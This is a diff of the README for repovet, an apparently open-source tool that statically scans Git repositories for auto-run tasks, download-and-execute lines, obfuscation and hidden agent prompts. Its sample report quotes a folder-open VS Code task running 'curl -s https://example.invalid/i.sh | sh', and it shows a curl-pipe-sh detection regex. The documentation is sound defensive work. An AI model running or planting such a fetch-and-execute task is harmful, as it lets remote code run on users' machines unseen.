@@ -1,3 +1,5 @@
+<div align="center">
+
 # repovet
 
 **Vet a Git repository before you run it.**
@@ -7,12 +9,187 @@
 [![CI](https://github.com/m3xXmo0/repovet/actions/workflows/ci.yml/badge.svg)](https://github.com/m3xXmo0/repovet/actions/workflows/ci.yml)
 [![License: MIT](https://img.shields.io/pypi/l/repovet.svg)](https://github.com/m3xXmo0/repovet/blob/main/LICENSE)
 
-repovet statically checks an untrusted Git repository **before** you run, install,
-build or open anything from it, and never executes code from it. You give it a local
-folder or a public GitHub URL; it gives you a list of findings and an honest list of
-what it could not check.
-
 [![repovet scanning the demo repository](https://raw.githubusercontent.com/m3xXmo0/repovet/main/docs/demo.gif)](https://github.com/m3xXmo0/repovet-demo)
+
+</div>
+
+repovet checks a Git repository **before** you run, install, build or open anything from
+it, and it never runs anything from it. Give it a public GitHub link or a folder on your
+computer; it shows what deserves a closer look and, just as honestly, what it could not
+check.
+
+- [Get started in three steps](#get-started-in-three-steps) (no experience needed)
+- [Use the menu](#use-the-menu) or [clone after checking](#clone-after-checking)
+- [Use it in CI](#use-it-in-ci) · [FAQ](#faq) · [All details](#contents)
+
+## Get started in three steps
+
+You do not need to know how to program. You type one command into a terminal window and
+press Enter; repovet does the rest and never changes anything on your computer except
+installing itself.
+
+**Step 1 – open a terminal**
+
+- **Windows:** press the Windows key, type `PowerShell`, press Enter.
+- **macOS:** press Cmd + Space, type `Terminal`, press Enter.
+- **Linux:** press Ctrl + Alt + T (or open "Terminal" from the menu).
+
+**Step 2 – install repovet** with [uv](https://docs.astral.sh/uv/), a small tool that
+also fetches the right Python for you. Copy the two lines for your system, paste them
+into the terminal and press Enter after each one.
+
+Windows (PowerShell):
+
+```
+powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
+uv tool install repovet
+```
+
+macOS and Linux:
+
+```
+curl -LsSf https://astral.sh/uv/install.sh | sh
+uv tool install repovet
+```
+
+If the terminal then says `repovet` is not found, close it, open a new one and continue.
+Already have Python 3.12 or newer? `pipx install repovet` or `pip install repovet` work
+too.
+
+Yes, the first line downloads and runs an installer, which is exactly the kind of thing
+repovet warns about. It comes from the official uv website; if you prefer, read the
+[uv installation page](https://docs.astral.sh/uv/getting-started/installation/) first or
+install Python from [python.org](https://www.python.org/downloads/) and use pipx.
+
+**Step 3 – check a repository.** Type `repovet` and press Enter. A menu opens:
+
+```
+repovet 0.2.0 - check a Git repository before you run anything from it.
+Nothing from the checked repository is run.
+
+What do you want to do?
+  1  Check a GitHub repository (URL)
+  2  Check a folder on this computer
+  3  Settings
+  4  Exit
+Choose 1-4:
+```
+
+Type `1`, press Enter, paste the link of the repository (for example
+`https://github.com/m3xXmo0/repovet-demo`, a harmless project made to show what repovet
+finds) and press Enter again.
+
+**Reading the result.** The report starts with a summary box:
+
+- the number of findings per level: **critical** and **high** mean code can run on its
+  own (when you install, build or open the project, or start an AI agent in it) or
+  something is clearly disguised; **medium** is worth a look; **low** and **info** are
+  hints and facts;
+- **"Look at these first"**: the three findings that matter most.
+
+Every finding below says where it is, what was found, why it matters (`Why`) and what to
+do (`Do`). Labels such as `[test]` or `[docs]` mark findings in test files, docs,
+examples or third-party code; they are shown, never hidden. At the end, **"Not checked"**
+lists what repovet could not look at. **No findings does not mean the repository is
+safe** – it means none of repovet's rules matched.
+
+## Use the menu
+
+Run `repovet` without anything after it in a terminal to get the menu. After a check you
+can show all details of one finding, save the report as an HTML page, JSON, SARIF or
+text, or check another repository. Under **Settings** you see whether a GitHub token is
+set (never its value, see [Trust](#trust-github-api)) and can turn off the GitHub API for
+the session (offline mode). The menu only appears when you type the command yourself: in
+scripts, pipes and CI, and whenever you give arguments, repovet behaves exactly like the
+commands below.
+
+## Clone after checking
+
+```
+repovet clone https://github.com/<owner>/<repo> [FOLDER]
+```
+
+`repovet clone` first runs the same check as `repovet scan` on the URL, shows the summary
+and then asks `Clone anyway? [y/N]` (Enter means no). Only if you answer `y` does it write
+the files into `FOLDER` (default: the repository name; it must not exist or must be
+empty).
+
+The clone is written from the very Git objects that were checked – nothing is downloaded
+twice – and it is deliberately limited: no Git hooks, no filters, no LFS downloads, no
+submodules, and symbolic links are not created (they are listed). Every path is checked
+before the first file is written; a repository with names that could escape the folder
+or overwrite Git's own files (`.git` in any spelling, `..`, Windows device names such as
+`aux`, `file:stream`, names that differ only in case) is not cloned at all. The folder
+gets a normal `.git` folder, so `git pull` works afterwards.
+
+`--yes` skips the question, but only when no finding is at or above `--fail-on` (default
+`high`); without a terminal, repovet never clones a repository with such findings. The
+exit code is the result of the check (0 or 1), whether you cloned or not.
+
+## Use it in CI
+
+repovet runs in any CI. In GitHub Actions, the SARIF report shows the findings in the
+**Security → Code scanning** tab and on pull requests:
+
+```yaml
+name: repovet
+on: [push, pull_request]
+permissions:
+  contents: read
+jobs:
+  repovet:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      security-events: write   # upload the SARIF report
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          persist-credentials: false
+      - uses: astral-sh/setup-uv@v10
+      - name: Check the repository
+        run: uvx repovet scan . --offline --format sarif -o repovet.sarif
+      - name: Upload the report
+        if: always()
+        uses: github/codeql-action/upload-sarif@v4
+        with:
+          sarif_file: repovet.sarif
+          category: repovet
+```
+
+The scan step fails when a finding is at or above `--fail-on` (default `high`); the upload
+step still runs (`if: always()`). Pin the actions to commit SHAs and repovet to a version
+(`uvx repovet@0.2.0`) in production workflows. Leave out `--offline` to add the trust
+indicators from the GitHub API (pass `GITHUB_TOKEN: ${{ github.token }}` as an
+environment variable for a higher rate limit).
+
+## FAQ
+
+**Does repovet upload my code?** No. The analysis runs on your computer and makes no
+network connections. There are only two: downloading a repository you gave as a GitHub
+URL (from github.com), and the trust check, which asks the public GitHub API about the
+repository and its owner (`api.github.com`; not your files). `--offline` turns the API
+off; a local folder with `--offline` makes no connection at all.
+
+**Does "no findings" mean the repository is safe?** No. It means that none of repovet's
+rules matched in the part that was checked. repovet looks for known patterns and keeps
+false alarms low; someone who knows the rules can avoid them. Read "Not checked" in every
+report and stay careful.
+
+**What do I do with a false positive?** Read the `Why` of the finding: some findings are
+right but harmless in your case (an official installer that pipes `curl` into `sh`, for
+example). To hide a rule in your own runs, use `--ignore-rule RC-...`; repovet never reads
+such settings from the checked repository. If a rule is plainly wrong, please
+[report it](https://github.com/m3xXmo0/repovet/issues/new/choose) with a small, harmless
+example – it helps everyone.
+
+**Does it run on Windows, macOS and Linux?** Yes, with Python 3.12 or newer (uv takes
+care of that).
+
+**Can repovet itself be attacked through a repository?** It is built not to be: it never
+runs, imports or builds anything from the repository, never calls the `git` program, and
+masks invisible and control characters before printing. See
+[Security model](#security-model); please report problems privately (SECURITY.md).
 
 ## Why?
 
@@ -26,29 +203,6 @@ A repository can run code on your machine long before you think you have "run" i
   `AGENTS.md` can carry prompts hidden in HTML comments or invisible Unicode.
 
 repovet looks for exactly these things, reading the files only as data.
-
-## Quick start
-
-Install it as a command-line tool with [uv](https://docs.astral.sh/uv/) (it downloads a
-matching Python if needed) or with pipx:
-
-```
-uv tool install repovet
-# or
-pipx install repovet
-```
-
-Scan a public repository without cloning it yourself:
-
-```
-repovet scan https://github.com/pallets/flask
-```
-
-Or try it on the demo repository, a harmless project built to show what repovet finds:
-
-```
-repovet scan https://github.com/m3xXmo0/repovet-demo
-```
 
 ## What it looks for
 
@@ -83,8 +237,8 @@ few false alarms; it never gives a safe/unsafe verdict or a score. Always read t
 - [Installation](#installation)
 - [Usage](#usage)
 - [Sample output](#sample-output)
+- [Reports: text, HTML, JSON and SARIF](#reports-text-html-json-and-sarif)
 - [Trust (GitHub API)](#trust-github-api)
-- [JSON and SARIF](#json-and-sarif)
 - [What is checked](#what-is-checked)
 - [Limits: what is not checked](#limits-what-is-not-checked)
 - [Security model](#security-model)
@@ -95,7 +249,7 @@ few false alarms; it never gives a safe/unsafe verdict or a score. Always read t
 
 ## Status
 
-Early: version 0.1.0 is the first release. It is built around three questions:
+Early: version 0.2.0 is the second release. It is built around three questions:
 
 | Category   | Question                                                                    |
 |------------|-----------------------------------------------------------------------------|
@@ -109,8 +263,10 @@ What works today:
   `https://github.com/<owner>/<repo>` is fetched into a temporary folder as Git objects
   only (no checkout, nothing from the repository is written under its own file name) and
   deleted after the scan.
-- **Reports** for the terminal, as JSON (`docs/report.schema.json`) or as SARIF 2.1.0
-  for code-scanning tools.
+- **A menu** (`repovet` without arguments in a terminal) and **`repovet clone`**, which
+  checks first and clones only after you agree.
+- **Reports** for the terminal (a summary box, grouped findings), as one HTML page, as
+  JSON (`docs/report.schema.json`) or as SARIF 2.1.0 for code-scanning tools.
 - **Danger, six areas:** auto-run code (`autorun`), AI agent instructions and
   configuration (`agents`), obfuscated code (`obfuscation`), download-and-execute
   (`download_exec`), binaries and file-system tricks (`binaries`) and suspicious
@@ -173,7 +329,10 @@ In a source checkout, put `uv run` in front of the commands below.
 ## Usage
 
 ```
-repovet scan PATH|URL [options]
+repovet                                  # menu (in a terminal)
+repovet scan PATH|URL [options]          # check and print a report
+repovet clone URL [FOLDER] [options]     # check, then clone if you agree
+repovet rules list [--area AREA]         # list the rules
 ```
 
 Examples:
@@ -188,6 +347,15 @@ repovet scan https://github.com/pallets/flask
 # A branch, a tag or a full commit id; keep the temporary Git objects for a look
 repovet scan https://github.com/pallets/flask --ref 3.1.0
 repovet scan https://github.com/pallets/flask --ref <40-character commit id> --keep-clone
+
+# Explain every finding (Why/Do also for medium, low and info) and list every place
+repovet scan ./some-repo --details
+
+# A report to open in the browser: one HTML file, no scripts, works offline
+repovet scan ./some-repo --format html -o report.html
+
+# Check first, then clone into ./flask if you answer y
+repovet clone https://github.com/pallets/flask
 
 # Plain output without colors (also set by the NO_COLOR environment variable)
 repovet scan ./some-repo --no-color
@@ -216,7 +384,8 @@ repovet rules list
 repovet rules list --area agents
 ```
 
-All `scan` options:
+`scan` options (`clone` takes the same, except `--keep-clone`, `--format`, `-o` and
+`--details`, plus `--yes`):
 
 | Option                  | Meaning                                                              |
 |-------------------------|----------------------------------------------------------------------|
@@ -230,11 +399,13 @@ All `scan` options:
 | `--keep-clone`          | URL targets: keep the temporary folder with the fetched Git objects; its path is printed. |
 | `--max-clone-size SIZE` | URL targets: abort if the download is larger (default: `500MB`).    |
 | `--clone-timeout SECONDS` | URL targets: abort the download after this time (default: `300`). |
-| `--format FORMAT`       | `text` (default), `json` or `sarif`.                                 |
+| `--format FORMAT`       | `text` (default), `json`, `sarif` or `html`.                         |
 | `-o`, `--output FILE`   | Write the report to FILE instead of stdout. FILE must be outside the checked folder. |
+| `--details`             | Text report: Why/Do for every finding (by default only for critical and high) and every place of grouped findings. |
 | `--no-color`            | Plain output without colors. `NO_COLOR` does the same; a non-empty `FORCE_COLOR` keeps colors when the output is piped. Reports written with `-o` never contain colors. |
 | `--offline`             | No GitHub API queries for the trust area (a URL target is still downloaded). |
 | `-v`, `--verbose`       | More detail.                                                         |
+| `--yes`, `-y`           | `clone` only: clone without asking, but only if no finding is at or above `--fail-on`. |
 
 Rule suppressions and other configuration are only taken from the command line, never
 from the checked repository (that content is controlled by whoever wrote the repository).
@@ -245,10 +416,22 @@ An excerpt from a real scan of a small test folder (path shortened, the URLs are
 placeholders):
 
 ```
-repovet 0.1.0 | local folder D:\src\demo | offline | 5 files | 126 rules
+repovet 0.2.0 · local folder D:\src\demo · offline · 6 files · 126 rules
 Lines starting with '>' are untrusted content quoted from the repository.
 
-DANGER                                   1 critical | 2 high | 1 medium
+┌─ SUMMARY ───────────────────────────────────────────────────────────────────┐
+│ 1 critical · 2 high · 1 medium · 0 low · 0 info                             │
+│                                                                             │
+│ Look at these first                                                         │
+│ 1. CRITICAL  RC-AUTO-021   .vscode/tasks.json:7                             │
+│    VS Code task that runs on folder open downloads or executes code         │
+│ 2. HIGH      RC-AUTO-020   .vscode/tasks.json:8                             │
+│    VS Code task runs when the folder is opened                              │
+│ 3. HIGH      RC-DEP-001    requirements.txt:2                               │
+│    Dependency name one typo away from a very popular package                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+DANGER                                   1 critical · 2 high · 1 medium
   CRITICAL  RC-AUTO-021   .vscode/tasks.json:7                  confidence high
             Task starts on folder open and fetches or runs code: curl -s
             https://example.invalid/i.sh | sh
@@ -259,46 +442,94 @@ DANGER                                   1 critical | 2 high | 1 medium
             Do   Do not trust this folder in VS Code. Open it in Restricted
                  Mode or another editor and remove the task before working with
                  it.
-
-  HIGH      RC-DEP-001    requirements.txt:2                  confidence medium
-            'reqeusts' looks like the popular package 'requests' (rank 7)
-            > reqeusts>=2.31
   ...
 
+  MEDIUM    RC-AUTO-001   package.json:1                        confidence high
+            package.json defines a 'postinstall' script: node scripts/setup.js
+            > {"name": "demo", "version": "1.0.0", "scripts": {"postinstall": "node scripts/setup.js"}}
+
+Why/Do for medium, low and info findings and all places: --details
+
 NOT CHECKED
-  - trust (GitHub API): no GitHub repository is known for this folder (no Git remote in .git/config)
-  - Environment and tool cache folders (.venv, venv, node_modules, .tox, .nox, .mypy_cache, .ruff_cache, .pytest_cache) skipped; use --include-env-dirs to check them (1): node_modules
+  - trust (GitHub API): no GitHub repository is known for this folder (no Git
+    remote in .git/config)
+  - Environment and tool cache folders (.venv, venv, node_modules, .tox, .nox,
+    .mypy_cache, .ruff_cache, .pytest_cache) skipped; use --include-env-dirs to
+    check them (1): node_modules
   - No .git folder; the Git history was not checked
-  - Dependencies are checked by name and declared source only; their code and install scripts are not checked (no registry queries) (2): package.json, requirements.txt
+  - Dependencies are checked by name and declared source only; their code and
+    install scripts are not checked (no registry queries) (2): package.json,
+    requirements.txt
 
 repovet reports only what its 126 rules detect in the checked scope.
 A missing finding is not proof that the repository is safe.
 ```
 
 Each finding has a rule ID, severity, confidence, file and line (where it applies), the
-reason (`Why`) and a recommendation (`Do`). Text quoted from the repository is masked
-before output: control characters and invisible Unicode characters are shown as
-`<U+XXXX>`, so they cannot change your terminal or mislead a reader. On a terminal with
-UTF-8 output, `|` in the header is shown as `·`.
+reason (`Why`) and a recommendation (`Do`). The report is compact by default:
+
+- The **summary box** counts the findings per level and names the three to look at first
+  (the most severe; at the same level, findings outside tests, docs, examples and
+  vendored code come first).
+- Findings of the same rule with the same message are **grouped**: one explanation, a
+  list of places with the quoted line, at most five, then `+N more`.
+- `Why` and `Do` are shown for **critical and high** findings; `--details` shows them for
+  all findings, and every place.
+- Findings in test files, docs, examples or vendored code carry a **label** such as
+  `[test]`. They are labelled, never hidden or downgraded: attackers put payloads there
+  too.
+
+Text quoted from the repository is masked before output: control characters and
+invisible Unicode characters are shown as `<U+XXXX>`, so they cannot change your terminal
+or mislead a reader. Without UTF-8 output, the box and the separators use plain ASCII.
 
 Before "Not checked", the report shows the provenance profile. It describes the
 repository; it is not a finding and not a quality score (same demo folder):
 
 ```
 PROVENANCE PROFILE                       facts, not findings
-  Files      5 files, 448 bytes; 5 text files with 22 lines, 0 binary
-  Languages  TypeScript 100% (1 file)
+  Files      6 files, 431 bytes; 6 text files with 19 lines, 0 binary
+  Languages  Python 66% (1 file), TypeScript 34% (1 file)
   Data, docs JSON (2), Markdown (1), Text (1)
-  Largest    .vscode/tasks.json (209 bytes), package.json (118 bytes),
-             src/index.ts (47 bytes)
-  Top level  .vscode/, src/, package.json, README.md, requirements.txt
-  Present    readme
-  Missing    license, tests, CI, docs, changelog, contributing guide, security
-             policy, code of conduct, code owners, dependency update bot
+  Largest    .vscode/tasks.json (208 bytes), package.json (90 bytes),
+             tests/test_install.py (50 bytes)
+  Top level  .vscode/, src/, tests/, package.json, README.md, requirements.txt
+  Present    readme, tests
+  Missing    license, CI, docs, changelog, contributing guide, security policy,
+             code of conduct, code owners, dependency update bot
   License    no license file found
   Notable    editor and IDE settings (1): .vscode/tasks.json
              package manifests (2): package.json, requirements.txt
 ```
+
+## Reports: text, HTML, JSON and SARIF
+
+- **Text** (default): see [Sample output](#sample-output).
+- **HTML** (`--format html -o report.html`): one self-contained file to open in any
+  browser, also offline. No JavaScript and no external resources (a Content Security
+  Policy blocks everything but the inline style sheet); every text from the repository is
+  masked and escaped. Findings are grouped and fold open (critical and high are open),
+  with severity colours, the profiles, "Not checked" and the notice. Light and dark mode
+  follow your system setting.
+
+- **JSON** (`--format json`): tool, target, scan data, a summary per severity and
+  category, the findings, the coverage gaps ("Not checked"), facts (`source` for URL
+  targets, `trust` and `provenance` profiles) and the disclaimer. The structure is
+  described in
+  [docs/report.schema.json](https://github.com/m3xXmo0/repovet/blob/main/docs/report.schema.json)
+  (`schema_version` 1.3; every finding has a `context` label or `null`).
+- **SARIF 2.1.0** (`--format sarif`) for GitHub code scanning and SARIF viewers: every
+  rule with title, reason, recommendation and `security-severity`; context labels in
+  `properties.context`; `critical`/`high`
+  findings have level `error`, `medium` `warning`, `low`/`info` `note`. Paths are relative
+  to `SRCROOT` (the checked folder). Coverage gaps appear as tool execution notifications.
+  Findings that concern a whole file point to line 1. The trust and provenance profiles
+  are in `runs[0].properties.facts`. For URL targets, `SRCROOT` is the GitHub URL of the
+  checked commit.
+
+JSON and SARIF contain only ASCII: text from the repository is sanitized like in the
+terminal report, and file paths in SARIF are percent-encoded. `--min-severity` filters
+all formats; the exit code never depends on the format.
 
 ## Trust (GitHub API)
 
@@ -359,26 +590,6 @@ TRUST PROFILE                            facts, not findings
   200 stars; only the latest release is looked at; manifests only in the root folder.
   Stars, accounts, dates and descriptions can all be faked.
 
-## JSON and SARIF
-
-- **JSON** (`--format json`): tool, target, scan data, a summary per severity and
-  category, the findings, the coverage gaps ("Not checked"), facts (`source` for URL
-  targets, `trust` and `provenance` profiles) and the disclaimer. The structure is
-  described in
-  [docs/report.schema.json](https://github.com/m3xXmo0/repovet/blob/main/docs/report.schema.json)
-  (`schema_version` 1.2).
-- **SARIF 2.1.0** (`--format sarif`) for GitHub code scanning and SARIF viewers: every
-  rule with title, reason, recommendation and `security-severity`; `critical`/`high`
-  findings have level `error`, `medium` `warning`, `low`/`info` `note`. Paths are relative
-  to `SRCROOT` (the checked folder). Coverage gaps appear as tool execution notifications.
-  Findings that concern a whole file point to line 1. The trust and provenance profiles
-  are in `runs[0].properties.facts`. For URL targets, `SRCROOT` is the GitHub URL of the
-  checked commit.
-
-Both formats contain only ASCII: text from the repository is sanitized like in the
-terminal report, and file paths in SARIF are percent-encoded. `--min-severity` filters
-both; the exit code never depends on the format.
-
 ## What is checked
 
 Severity says how bad it is if the finding means what the rule claims; confidence says how
@@ -404,6 +615,20 @@ to pick one area). The rules are grouped in these areas:
 Rules are data, not code: each one is a YAML entry with an ID, severity, confidence, file
 patterns, a check, and texts for message, reason and recommendation. Rule IDs are never
 renamed or reused.
+
+Two details that keep false alarms down without hiding anything:
+
+- **Agent skills** (`SKILL.md`) count as files agents load only in the folders the agents
+  load them from, such as `.claude/skills` (Claude Code, also in subfolders),
+  `.agents/skills` (Codex, Cursor, GitHub Copilot, OpenCode and others), `.github/skills`
+  (Copilot) and `.cursor/skills`. The full list per tool, with links to each tool's
+  documentation, is in
+  [docs/agent-skills.md](https://github.com/m3xXmo0/repovet/blob/main/docs/agent-skills.md).
+  Other `SKILL.md` files (test fixtures, plugin folders) are still checked for hidden
+  text and dangerous instructions and appear in the provenance profile.
+- A download-and-execute or decode-and-execute match that is clearly a **regular
+  expression inside a string** (security tools ship the patterns they look for, such as
+  `r"curl\s+[^|]*\|\s*sh"`) is reported with confidence `low` instead of being dropped.
 
 ## Limits: what is not checked
 
@@ -486,6 +711,14 @@ code.
   Object sizes are checked before anything is unpacked, so a small download cannot inflate
   into gigabytes. The folder is deleted after the scan.
 
+- **`repovet clone` writes only what was checked:** the working tree comes from the Git
+  objects of the scan (no second download), every path is validated before the first
+  file is written (no `.git` in any spelling, no `..`, no absolute paths, Windows device
+  names, alternate data streams or case collisions; one bad path stops the whole clone),
+  files are created new and never through a link, symbolic links and submodules are not
+  created, and no hooks, filters or LFS run. The `.git` folder gets a fixed, minimal
+  configuration and no hooks. A partly written clone is removed on any error.
+
 Found a way to break one of these guarantees? Please report it privately, as described in
 [SECURITY.md](https://github.com/m3xXmo0/repovet/blob/main/SECURITY.md).
 
@@ -498,14 +731,19 @@ The exit codes are a stable interface for scripts and CI:
 | 0    | No findings at or above `--fail-on` (this does not mean the repository is safe) |
 | 1    | At least one finding at or above `--fail-on`                                     |
 | 2    | Usage error: invalid arguments, target not found, invalid rules file, unsupported URL |
-| 3    | Analysis aborted: download failed or hit a limit, internal error, interruption   |
+| 3    | Analysis aborted: download failed or hit a limit, internal error, interruption; for `clone` also a path that may not be written or a write error |
+
+`repovet clone` returns the result of its check (0 or 1) whether or not it cloned; a
+declined clone returns 0 without and 1 with findings at or above `--fail-on`. Without a
+terminal, 1 always means that nothing was cloned. The menu returns the result of the
+last check (0 without one) and 3 on Ctrl+C.
 
 ## Development
 
 ```
 uv sync                      # create .venv with the pinned dev tools
 uv run pytest                # all tests
-uv run mypy                  # strict type check of src and tests
+uv run mypy src tests scripts  # strict type check
 uv run ruff check            # lint, including security rules
 uv run ruff format --check   # formatting
 ```
@@ -538,6 +776,20 @@ REPOVET_CORPUS_DIR=/path/to/corpus uv run pytest -m corpus
 # PowerShell
 $env:REPOVET_CORPUS_DIR = "C:\path\to\corpus"; uv run pytest -m corpus
 ```
+
+To compare false positives between versions, `scripts/corpus_counts.py` scans every
+corpus repository by URL at its pinned commit (offline, no API) and prints the findings
+per rule; `--save counts.json` keeps them and `--compare counts.json` shows the change
+rule by rule. It needs the network and is not part of the tests.
+
+`docs/social-preview.png` (the picture GitHub shows when the repository is shared) is
+generated with `uv run --group docs python scripts/social_preview.py`; Pillow is only in
+that optional group.
+
+Contributions are welcome; see
+[CONTRIBUTING.md](https://github.com/m3xXmo0/repovet/blob/main/CONTRIBUTING.md) for how to
+add a rule with its rule cases, and the
+[code of conduct](https://github.com/m3xXmo0/repovet/blob/main/CODE_OF_CONDUCT.md).
 
 ## Roadmap
 
